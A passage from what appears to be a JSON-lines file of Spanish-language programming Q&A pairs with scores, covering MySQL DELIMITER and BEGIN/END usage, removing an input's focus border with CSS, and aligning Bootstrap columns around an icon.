omitir el uso de este operador; puede desenvocar en un error de este tipo:\n\nERROR 1064 (42000): You have an error in your SQL syntax; check the\n  manual that corresponds to your MySQL server version for the right\n  syntax to use near '' at line 4\n\nAunque pudiste crearlos sin ayuda de este operador deberías tenerlo en cuenta para su implementación cuando ejecutes la creación de estas estructuras y tengan en ellas mismas el uso de BEGIN y END.\nCaso 2\nUn TRIGGER puede ser explícitamente creado sin la necesidad de los DELIMITER de inicio y fin cuando carece de las instrucciones: BEGIN y END lo cual nos indica que la sentencia tiene una estructura simple.\nEl siguiente trigger podrá ser creado sin el uso del delimitador\nCREATE TRIGGER multiplicaIds BEFORE INSERT ON users\n    FOR EACH ROW \n        SET New.id = (SELECT MAX(id) * 10 FROM users);\n\nUSO DE BEGIN y END\nUna forma de identificar si requerimos una estructura compleja y que por ende necesitará de BEGIN y de END es si por ejemplo tendremos múltiples sentencias SELECT dentro del mismo PA, por ejemplo:\nDELIMITER //\nCREATE PROCEDURE filtraDatos(IN id1 INT, IN id2 INT)\nBEGIN\n    SELECT * FROM tabla1 WHERE id = id1;\n    SELECT * FROM tabla2 WHERE id = id2;\nEND;\n//\n\nMismo PA al que invocamos de este modo:\nCALL filtraDatos(1, 2);\n\nReferencias\n\nDELIMITER\n\n", "question_score": "9", "answer_score": 20}
{"title": "Quitar los bordes cuando este activo el input", "description": "Estoy intentando quitar los bordes del input cuando este focuseado o activo, pero no funciona de ninguna manera estoy usando bootstrap y sass, pero de ninguna forma esta funcionando aqui muestro lo que quiero.\n\nDeseao quitar el borde amarillo-rojo-verde que aparece ahi cuando se le de click para escribir\n<div class=\"row\">\n       <div class=\"form-group mx-auto\">\n             <input type=\"email\" class=\"form-control-lg border-0\" placeholder=\"Correo Electronico\">\n       </div>\n\n </div>\n\nEstilos\n\n.form-control-lg {\n            background: $main-color-l;\n            border-bottom: 2px solid $shadow-green !important;\n            color: white;\n            margin-top: 10px;\n\n            &:focus {\n                border: none;\n            }\n\n            &:active {\n                border: none;\n            }\n        }\n\n", "answer": "Salvo que tengas los estilos de bootstrap después de los que deseas aplicar de manera personalizada; es decir:\nEl orden de tus códigos CSS debería estar así:\n<link rel=\"stylesheet\" href=\"bootstrap.css\">\n<link rel=\"stylesheet\" href=\"misestilos.css\">\n\nPara que de este modo si tienes tú código organizado así, los últimos  en aplicarse sean los estilos personalizados\n\nAhora con CSS tendrías un input así:\n<input type=\"email\" class=\"form-control-lg border-0\" placeholder=\"Correo Electronico\">\n\nPosterior con CSS  modificamos su apariencia de este modo:\n.form-control-lg{\n      border: 1px solid red;\n      outline: none;\n}\n\nUsamos la pseudoclase :focus para identificar cuando la caja de texto se le ha dado click y esta disponible para escritura\nCon outline: none; quitamos el borde por defecto que se coloca cuando ponemos el cursor del mouse\nCon border: 1px solid red; solo estamos poniendo un color distinto que haga que se note el cambio\n\nEjemplo completo\n\n    <!DOCTYPE html>\n    <html>\n    <head>\n      <meta charset=\"utf-8\">\n      <meta name=\"viewport\" content=\"width=device-width\">\n      <link rel=\"stylesheet\" href=\"\">\n      <title>Ejemplo</title>\n      <style>\n        .form-control-lg{\n          border: solid 1px blue;\n        }\n        .form-control-lg:focus{\n          border: 1px solid red;\n          outline: none;\n        }\n      </style>\n    </head>\n    <body>\n    <input type=\"text\" class=\"form-control-lg\">\n    </body>\n    </html>\n\n", "question_score": "9", "answer_score": 15}
{"title": "Alinear divs con un ícono usando Bootstrap", "description": "Quiero poder alinear estos dos div en una misma linea, y a su vez, entremedio de estos dos, poder agregar un ícono.\nAquí una imagen de como me gustaría que quedara:\n\n<link href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.css\" rel=\"stylesheet\">\r\n<link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\">\r\n<script src=\"https://code.jquery.com/jquery-3.3.1.slim.min.js\" integrity=\"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo\" crossorigin=\"anonymous\"></script>\r\n<script src=\"https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js\" integrity=\"sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1\" crossorigin=\"anonymous\"></script>\r\n<script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\" integrity=\"sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM\" crossorigin=\"anonymous\"></script>\r\n\r\n<section class=\"section\">\r\n    <div class=\"row\">\r\n        <div class=\"col-lg-12 col-md-12\">\r\n            <div class=\"card mb-4\">\r\n              <div class=\"card-header\">\r\n                <small class=\"form-text text-muted\">\r\n                    <i class=\"fas fa-tools\"></i> Details  \r\n                </small>\r\n              </div>\r\n                <div class=\"card-body\">\r\n                    <p class=\"font-weight-light text-sm-left\" style=\"margin-bottom: 0rem;\"></p>\r\n                    <div class=\"row\">\r\n                        <div class=\"col-md-2 select-outline mb-2\">\r\n                            <small class=\"form-text text-muted\">Price</small>\r\n                            <input class=\"form-control\" aria-describedby=\"inputGroup-sizing-sm\" name=\"txt_fl\" id=\"txt_fl\" readonly> <i class=\"fa fa-equals float-right\"></i>\r\n                        </div>\r\n\r\n                        <div class=\"col-md-1 select-outline mb-2\">\r\n                            <small class=\"form-text text-muted\">&nbsp; Total</small>\r\n                            <input class=\"form-control\" aria-describedby=\"inputGroup-sizing-sm\" name=\"txt_fl_result\" id=\"txt_fl_result\" readonly>\r\n                        </div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</section>\n\nSi alguien tiene alguna forma de hacer esto u otra solución agregando un span seria útil.\n", "answer": "Bootstrap ofrece múltiples clases de utilidad para trabajar con flexbox. Aquí te dejo una tabla con algunas de ellas mostrando la propiedad y el valor que aplicarán:\n┌────────────────────┬───────────────────────┬────────┐\n│ Clase Bootstrap    │ Propiedad             │ Valor  │\n├────────────────────┼───────────────────────┼────────┤\n│ d-flex             │ display               │ flex   │\n│ flex-column        │ flex-direction        │ column │\n│ flex-grow-1        │ flex-grow             │ 1      │\n│ align-items-center │ align-items           │ center │\n└────────────────────┴───────────────────────┴────────┘\n\nTeniendo esto en cuenta, puedes crear una columna entre las columnas de los inputs con las siguientes clases:\n<div class=\"d-flex flex-column\">\n    <small class=\"form-text text-muted\">&nbsp,</small>\n    <i class=\"fa fa-equals d-flex flex-grow-1 align-items-center\"></i>\n</div>\n\nLo que creará un contenedor con display flex y dirección de columnas. Al situar dentro del mismo (y antes del ícono) un elemento con las mismas clases que los labels de los inputs pero con un texto vacío, lograremos que el ícono quede en el espacio creado por la altura de los inputs. Y si al contenedor del ícono le aplicamos flex-grow con valor 1 y align-items con valor center, lograremos que el mismo ocupe el alto restante y que sus elementos (en ese caso el ::before que contiene el ícono) queden centrados en la vertical:\n\nHe eliminado múltiples elementos, propiedades y clases para hacer el ejemplo más conciso y que se pueda ver claramente el cambio.\n\n<link href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.css\" rel=\"stylesheet\">\r\n<link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\" integrity=\"sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\" crossorigin=\"anonymous\">\r\n\r\n<div class=\"card-body\">\r\n  <div class=\"row\">\r\n    <div class=\"col\">\r\n      <small class=\"form-text text-muted\">Price</small>\r\n      <input class=\"form-control\" readonly>\r\n    </div>\r\n    <div class=\"d-flex flex-column\">\r\n      <small class=\"form-text text-muted\">&nbsp,</small>\r\n      <i class=\"fa fa-equals d-flex flex-grow-1 align-items-center\"></i>\r\n    </div>\r\n    <div class=\"col\">\r\n      <small class=\"form-text text-muted\">Total</small>\r\n      <input class=\"form-control\" readonly>\r\n    </div>\r\n  </div>\r\n</div>\n\n", "question_score": "9", "answer_score": 12}